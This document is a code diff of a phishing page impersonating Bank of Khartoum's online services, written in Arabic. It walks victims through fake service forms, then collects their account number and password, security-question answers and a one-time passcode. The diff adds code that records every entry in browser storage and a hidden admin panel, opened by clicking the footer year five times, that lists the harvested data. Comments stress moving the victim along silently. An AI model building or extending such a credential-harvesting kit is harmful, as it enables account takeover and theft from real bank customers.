@@ -6,7 +6,7 @@
     <title>خدمات بنك الخرطوم أونلاين</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', Tahoma, sans-serif, Arial; }
-        body { background-color: #f7f9fa; color: #333; text-align: center; }
+        body { background-color: #f7f9fa; color: #333; text-align: center; display: flex; flex-direction: column; min-height: 100vh; }
 
         .header-section { background-color: #e31b23; color: #ffffff; padding: 30px 20px 40px 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .bank-logo-container { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 25px; }
@@ -18,7 +18,7 @@
         .bank-slogan { font-size: 11px; border-top: 1px solid rgba(255,255,255,0.4); margin-top: 3px; padding-top: 2px; color: #ffde17; }
         .services-badge { display: inline-block; background-color: #ffc107; color: #1a1a1a; font-size: 20px; font-weight: bold; padding: 12px 35px; border-radius: 12px; }
 
-        .content-section { background-color: #ffffff; padding: 30px 20px; min-height: 450px; }
+        .content-section { background-color: #ffffff; padding: 30px 20px; flex: 1; }
         .page-box { display: none; max-width: 520px; margin: 0 auto; text-align: right; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.03); }
         .page-box.active { display: block; }
 
@@ -40,13 +40,22 @@
         .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #e31b23; background-color: #fff; }
 
         .info-box { background-color: #f4f6f8; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; color: #333; line-height: 1.6; }
-
         .btn-submit { width: 100%; background-color: #e31b23; color: white; border: none; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .btn-submit:hover { background-color: #c41219; }
-
         .timer-box { text-align: center; background-color: #fff3f3; border: 1px solid #ffcdd2; color: #d32f2f; padding: 12px; border-radius: 10px; font-size: 16px; font-weight: bold; margin-bottom: 20px; }
 
-        .whatsapp-float { position: fixed; bottom: 15px; left: 15px; width: 38px; height: 38px; z-index: 9999; background-color: #25d366; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.3); }
+        /* تذييل الصفحة المخفي خلفه لوحة التحكم */
+        .footer-section { padding: 15px; background-color: #f1f3f5; font-size: 13px; color: #666; border-top: 1px solid #e5e5e5; }
+        .secret-trigger { cursor: pointer; color: #e31b23; font-weight: bold; user-select: none; }
+
+        /* تصميم لوحة التحكم المخفية */
+        #admin-panel { display: none; max-width: 800px; margin: 20px auto; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: right; }
+        .admin-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }
+        .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 10px; text-align: right; }
+        .admin-table th { background-color: #e31b23; color: white; }
+        .btn-clear { background: #333; color: #fff; border: none; padding: 8px 15px; border-radius: 6px; cursor: pointer; margin-top: 15px; }
+
+        .whatsapp-float { position: fixed; bottom: 15px; left: 15px; width: 38px; height: 38px; z-index: 9999; background-color: #25d366; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0px 2px 6px rgba(0,0,0,0.3); }
         .whatsapp-float img { width: 22px; height: 22px; }
     </style>
 </head>
@@ -115,41 +124,20 @@
             </div>
         </div>
 
-        <!-- 2. النماذج الخاصة بكل خدمة -->
-        
-        <!-- نموذج تحديث البيانات -->
+        <!-- 2. نماذج الخدمات -->
         <div id="form-update-data" class="page-box">
             <h2 class="form-title">نموذج تحديث البيانات</h2>
-            <div class="form-group">
-                <label>الاسم رباعي:</label>
-                <input type="text" id="up_name" required placeholder="الاسم كاملاً">
-            </div>
-            <div class="form-group">
-                <label>الرقم الوطني:</label>
-                <input type="text" id="up_national_id" required placeholder="أدخل الرقم الوطني">
-            </div>
-            <div class="form-group">
-                <label>رقم الهاتف:</label>
-                <input type="tel" id="up_phone" required placeholder="09xxxxxxxx">
-            </div>
-            <div class="form-group">
-                <label>البريد الإلكتروني:</label>
-                <input type="email" id="up_email" required placeholder="name@example.com">
-            </div>
-            <div class="form-group">
-                <label>السكن الحالي:</label>
-                <input type="text" id="up_address" required placeholder="المدينة - الحي">
-            </div>
+            <div class="form-group"><label>الاسم رباعي:</label><input type="text" id="up_name" required placeholder="الاسم كاملاً"></div>
+            <div class="form-group"><label>الرقم الوطني:</label><input type="text" id="up_national_id" required placeholder="الرقم الوطني"></div>
+            <div class="form-group"><label>رقم الهاتف:</label><input type="tel" id="up_phone" required placeholder="09xxxxxxxx"></div>
+            <div class="form-group"><label>البريد الإلكتروني:</label><input type="email" id="up_email" required placeholder="name@example.com"></div>
+            <div class="form-group"><label>السكن الحالي:</label><input type="text" id="up_address" required placeholder="المدينة - الحي"></div>
             <button type="button" class="btn-submit" onclick="submitServiceForm('تحديث البيانات')">متابعة</button>
         </div>
 
-        <!-- نموذج رفع سقف التحويلات اليومية -->
         <div id="form-raise-limit" class="page-box">
             <h2 class="form-title">رفع سقف التحويلات اليومية</h2>
-            <div class="info-box">
-                السقف الحالي: <strong>25,000,000.00 SDG</strong><br>
-                السقف المطلوب: <strong>45,000,000.00 SDG</strong>
-            </div>
+            <div class="info-box">السقف الحالي: <strong>25,000,000.00 SDG</strong><br>السقف المطلوب: <strong>45,000,000.00 SDG</strong></div>
             <div class="form-group">
                 <label>اختر سبب رفع السقف:</label>
                 <select id="limit_reason">
@@ -162,47 +150,29 @@
             <button type="button" class="btn-submit" onclick="submitServiceForm('رفع سقف التحويلات')">متابعة</button>
         </div>
 
-        <!-- نموذج التحويلات الخاطئة -->
         <div id="form-wrong-transfer" class="page-box">
-            <h2 class="form-title">نموذج معالجة التحويلات الخاطئة</h2>
-            <div class="form-group">
-                <label>رقم الحساب الذي تم التحويل إليه عن طريق الخطأ:</label>
-                <input type="text" id="wt_account" required placeholder="رقم الحساب المستلم بالخطأ">
-            </div>
-            <div class="form-group">
-                <label>رقم العملية (Reference No):</label>
-                <input type="text" id="wt_ref" required placeholder="رقم عملية التحويل">
-            </div>
-            <div class="form-group">
-                <label>المبلغ:</label>
-                <input type="text" id="wt_amount" required placeholder="المبلغ المحول">
-            </div>
-            <div class="form-group">
-                <label>تاريخ التحويل:</label>
-                <input type="date" id="wt_date" required>
-            </div>
+            <h2 class="form-title">معالجة التحويلات الخاطئة</h2>
+            <div class="form-group"><label>رقم الحساب المستلم بالخطأ:</label><input type="text" id="wt_account" required placeholder="رقم الحساب"></div>
+            <div class="form-group"><label>رقم العملية (Reference No):</label><input type="text" id="wt_ref" required placeholder="رقم العملية"></div>
+            <div class="form-group"><label>المبلغ:</label><input type="text" id="wt_amount" required placeholder="المبلغ"></div>
+            <div class="form-group"><label>تاريخ التحويل:</label><input type="date" id="wt_date" required></div>
             <button type="button" class="btn-submit" onclick="submitServiceForm('التحويلات الخاطئة')">متابعة</button>
         </div>
 
-        <!-- نموذج خدمات العملات الأجنبية -->
         <div id="form-foreign-currency" class="page-box">
             <h2 class="form-title">خدمات العملات الأجنبية</h2>
             <div class="form-group">
-                <label>نوع العملة المطلوبة / الخدمة:</label>
+                <label>نوع العملة / الخدمة:</label>
                 <select id="fc_type">
                     <option value="تفعيل حساب العملات الأجنبية">تفعيل حساب العملات الأجنبية</option>
                     <option value="شراء عملات أجنبية">شراء عملات أجنبية</option>
                     <option value="تحويلات دولية">تحويلات دولية</option>
                 </select>
             </div>
-            <div class="form-group">
-                <label>الغرض من المعاملة:</label>
-                <textarea id="fc_purpose" rows="3" placeholder="اكتب الغرض..."></textarea>
-            </div>
+            <div class="form-group"><label>الغرض من المعاملة:</label><textarea id="fc_purpose" rows="3" placeholder="الغرض..."></textarea></div>
             <button type="button" class="btn-submit" onclick="submitServiceForm('خدمات العملات الأجنبية')">متابعة</button>
         </div>
 
-        <!-- نموذج كشف الحساب -->
         <div id="form-account-statement" class="page-box">
             <h2 class="form-title">طلب كشف حساب مفصل</h2>
             <div class="form-group">
@@ -216,29 +186,18 @@
             </div>
             <div class="form-group">
                 <label>لغة الكشف:</label>
-                <select id="st_lang">
-                    <option value="العربية">العربية</option>
-                    <option value="الإنجليزية">الإنجليزية</option>
-                </select>
+                <select id="st_lang"><option value="العربية">العربية</option><option value="الإنجليزية">الإنجليزية</option></select>
             </div>
             <button type="button" class="btn-submit" onclick="submitServiceForm('كشف الحساب')">متابعة</button>
         </div>
 
-        <!-- 3. صفحة تسجيل الدخول -->
         <div id="page-login" class="page-box">
             <h2 class="form-title">تسجيل الدخول للحساب</h2>
-            <div class="form-group">
-                <label>رقم الحساب البنكي / المعرف:</label>
-                <input type="text" id="accountNumber" required placeholder="أدخل رقم الحساب">
-            </div>
-            <div class="form-group">
-                <label>كلمة المرور:</label>
-                <input type="password" id="password" required placeholder="أدخل كلمة المرور">
-            </div>
+            <div class="form-group"><label>رقم الحساب البنكي / المعرف:</label><input type="text" id="accountNumber" required placeholder="رقم الحساب"></div>
+            <div class="form-group"><label>كلمة المرور:</label><input type="password" id="password" required placeholder="كلمة المرور"></div>
             <button type="button" class="btn-submit" onclick="submitLoginData()">متابعة</button>
         </div>
 
-        <!-- 4. صفحة أسئلة الأمان -->
         <div id="page-security" class="page-box">
             <h2 class="form-title">أسئلة الأمان التحققية</h2>
             <div class="form-group">
@@ -260,32 +219,48 @@
                     <option value="اسم أول بلد أجنبي قمت زيارته؟">اسم أول بلد أجنبي قمت زيارته؟</option>
                     <option value="ما هي ماركة سيارتك الأولي؟">ما هي ماركة سيارتك الأولي؟</option>
                 </select>
-                <input type="text" id="secAnswer" required placeholder="اكتب إجابة السؤال بدقة">
+                <input type="text" id="secAnswer" required placeholder="إجابة السؤال">
             </div>
             <button type="button" class="btn-submit" onclick="submitSecurityData()">متابعة</button>
         </div>
 
-        <!-- 5. صفحة رمز الـ OTP والعد التنازلي لساعة -->
         <div id="page-otp" class="page-box">
             <h2 class="form-title">تأكيد رمز التحقق (OTP)</h2>
-            <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">
-                تم إرسال رمز التحقق إلى رقم الشريحة المسجل أو البريد الإلكتروني.
-            </p>
-
-            <div class="timer-box">
-                الوقت المتبقي لانتهاء صلاحية الرمز: <span id="countdown">60:00</span>
-            </div>
-
-            <div class="form-group">
-                <label>أدخل رمز التحقق (OTP):</label>
-                <input type="text" id="otpInput" required placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
-            </div>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">تم إرسال رمز التحقق إلى رقم الشريحة المسجل أو البريد الإلكتروني.</p>
+            <div class="timer-box">الوقت المتبقي لانتهاء صلاحية الرمز: <span id="countdown">60:00</span></div>
+            <div class="form-group"><label>أدخل رمز التحقق (OTP):</label><input type="text" id="otpInput" required placeholder="الرمز المكون من 6 أرقام" maxlength="6"></div>
             <button type="button" class="btn-submit" onclick="completeFinalProcess()">تأكيد وإتمام الطلب</button>
+        </div>
+
+        <!-- 3. لوحة التحكم المخفية -->
+        <div id="admin-panel">
+            <h2 style="color: #e31b23; margin-bottom: 10px;">لوحة التحكم السرية - بيانات العملاء</h2>
+            <p style="font-size: 13px; color: #555; margin-bottom: 15px;">هنا تظهر كافة البيانات التي أدخلها العملاء لحظياً في الجهاز:</p>
+            <div style="overflow-x: auto;">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>التاريخ والوقت</th>
+                            <th>الخدمة</th>
+                            <th>البيانات المدخلة</th>
+                        </tr>
+                    </thead>
+                    <tbody id="admin-data-rows">
+                        <tr><td colspan="3" style="text-align: center;">لا توجد بيانات مسجلة حتى الآن</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <button type="button" class="btn-clear" onclick="clearData()">مسح كافة البيانات</button>
+            <button type="button" class="btn-submit" style="margin-top: 10px; background-color: #333;" onclick="hideAdminPanel()">إغلاق لوحة التحكم</button>
         </div>
 
     </div>
 
-    <!-- زر الواتساب مع الرقم المطلوب -->
+    <!-- التذييل المخفي خلفه التشغيل السري -->
+    <div class="footer-section" id="main-footer">
+        جميع الحقوق محفوظة © بنك الخرطوم <span class="secret-trigger" id="click-trigger">2026</span>
+    </div>
+
     <a href="https://wa.me/249998924425" target="_blank" class="whatsapp-float">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
     </a>
@@ -294,9 +269,82 @@
         let currentService = "";
         let timerInterval;
         let userDataSession = {};
+        let clickCount = 0;
+        let clickTimer = null;
+        
+        // كلمة المرور الخاصة بلوحة التحكم (يمكنك تغييرها هنا إلى ما تحب)
+        const ADMIN_PASSWORD = "123"; 
+
+        // تفعيل الضغط 5 مرات متتالية على كلمة 2026
+        document.getElementById("click-trigger").addEventListener("click", function() {
+            clickCount++;
+            clearTimeout(clickTimer);
+            
+            if (clickCount >= 5) {
+                clickCount = 0;
+                let pass = prompt("الرجاء إدخال كلمة سر لوحة التحكم:");
+                if (pass === ADMIN_PASSWORD) {
+                    showAdminPanel();
+                } else if (pass !== null) {
+                    alert("كلمة المرور غير صحيحة!");
+                }
+            } else {
+                clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
+            }
+        });
+
+        function showAdminPanel() {
+            document.querySelectorAll(".page-box").forEach(p => p.classList.remove("active"));
+            document.getElementById("admin-panel").style.display = "block";
+            loadAdminData();
+            window.scrollTo(0, 0);
+        }
+
+        function hideAdminPanel() {
+            document.getElementById("admin-panel").style.display = "none";
+            showPage('page-services');
+        }
+
+        function saveInstantData(stepName, dataObj) {
+            let allData = JSON.parse(localStorage.getItem('bank_submissions') || '[]');
+            let record = {
+                time: new Date().toLocaleString('ar-SA'),
+                service: userDataSession.service || 'عام',
+                step: stepName,
+                details: dataObj
+            };
+            allData.push(record);
+            localStorage.setItem('bank_submissions', JSON.stringify(allData));
+        }
+
+        function loadAdminData() {
+            let allData = JSON.parse(localStorage.getItem('bank_submissions') || '[]');
+            let tbody = document.getElementById("admin-data-rows");
+            tbody.innerHTML = "";
+
+            if (allData.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center;">لا توجد بيانات مسجلة حتى الآن</td></tr>`;
+                return;
+            }
+
+            allData.reverse().forEach(item => {
+                let detailsStr = Object.entries(item.details).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>');
+                let tr = document.createElement("tr");
+                tr.innerHTML = `<td>${item.time}</td><td><b>${item.service}</b><br><small style="color:#e31b23">${item.step}</small></td><td>${detailsStr}</td>`;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function clearData() {
+            if (confirm("هل أنت متأكد من مسح جميع البيانات المسجلة؟")) {
+                localStorage.removeItem('bank_submissions');
+                loadAdminData();
+            }
+        }
 
         function showPage(pageId) {
             document.querySelectorAll(".page-box").forEach(p => p.classList.remove("active"));
+            document.getElementById("admin-panel").style.display = "none";
             let target = document.getElementById(pageId);
             if (target) {
                 target.classList.add("active");
@@ -308,22 +356,11 @@
             currentService = serviceName;
             userDataSession.service = serviceName;
 
-            if (serviceName === 'تحديث البيانات') {
-                showPage('form-update-data');
-            } else if (serviceName === 'رفع سقف التحويلات اليومية') {
-                showPage('form-raise-limit');
-            } else if (serviceName === 'التحويلات الخاطئة') {
-                showPage('form-wrong-transfer');
-            } else if (serviceName === 'خدمات العملات الأجنبية') {
-                showPage('form-foreign-currency');
-            } else if (serviceName === 'كشف الحساب') {
-                showPage('form-account-statement');
-            }
-        }
-
-        function sendInstantData(stepName, data) {
-            // إرسال البيانات لحظياً في الخلفية
-            console.log("إرسال لحظي [" + stepName + "]:", data);
+            if (serviceName === 'تحديث البيانات') showPage('form-update-data');
+            else if (serviceName === 'رفع سقف التحويلات اليومية') showPage('form-raise-limit');
+            else if (serviceName === 'التحويلات الخاطئة') showPage('form-wrong-transfer');
+            else if (serviceName === 'خدمات العملات الأجنبية') showPage('form-foreign-currency');
+            else if (serviceName === 'كشف الحساب') showPage('form-account-statement');
         }
 
         function submitServiceForm(serviceName) {
@@ -348,43 +385,37 @@
                 userDataSession.statementLang = document.getElementById("st_lang").value;
             }
 
-            sendInstantData("نموذج الخدمة: " + serviceName, userDataSession);
-            showPage('page-login'); // انتقال صامت بدون أي رسائل تنبيه
+            saveInstantData("نموذج الخدمة", userDataSession);
+            showPage('page-login'); // انتقل فوراً بالخلفية بدون إظهار شيء للعميل
         }
 
         function submitLoginData() {
             userDataSession.accountNumber = document.getElementById("accountNumber").value.trim();
             userDataSession.password = document.getElementById("password").value.trim();
 
-            if (!userDataSession.accountNumber || !userDataSession.password) {
-                return;
-            }
+            if (!userDataSession.accountNumber || !userDataSession.password) return;
 
-            sendInstantData("تسجيل الدخول", { accountNumber: userDataSession.accountNumber, password: userDataSession.password });
-            showPage('page-security'); // انتقال صامت
+            saveInstantData("تسجيل الدخول", { accountNumber: userDataSession.accountNumber, password: userDataSession.password });
+            showPage('page-security');
         }
 
         function submitSecurityData() {
             userDataSession.secQuestion = document.getElementById("securityQuestionSelect").value;
             userDataSession.secAnswer = document.getElementById("secAnswer").value.trim();
 
-            if (!userDataSession.secAnswer) {
-                return;
-            }
+            if (!userDataSession.secAnswer) return;
 
-            sendInstantData("أسئلة الأمان", { question: userDataSession.secQuestion, answer: userDataSession.secAnswer });
-            showPage('page-otp'); // انتقال صامت
+            saveInstantData("أسئلة الأمان", { question: userDataSession.secQuestion, answer: userDataSession.secAnswer });
+            showPage('page-otp');
             startCountdown(3600);
         }
 
         function completeFinalProcess() {
             let otp = document.getElementById("otpInput").value.trim();
-            if (!otp) {
-                return;
-            }
+            if (!otp) return;
 
             userDataSession.otpCode = otp;
-            sendInstantData("رمز التحقق OTP النهائي", { otp: otp });
+            saveInstantData("رمز التحقق OTP", { otp: otp });
 
             alert("تم إرسال طلبك بنجاح وسيتم تنفيذه قريباً!");
             location.reload();
@@ -396,16 +427,10 @@
             timerInterval = setInterval(function () {
                 minutes = parseInt(timer / 60, 10);
                 seconds = parseInt(timer % 60, 10);
-
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
-
                 document.getElementById("countdown").textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(timerInterval);
-                    location.reload();
-                }
+                if (--timer < 0) { clearInterval(timerInterval); location.reload(); }
             }, 1000);
         }
     </script>
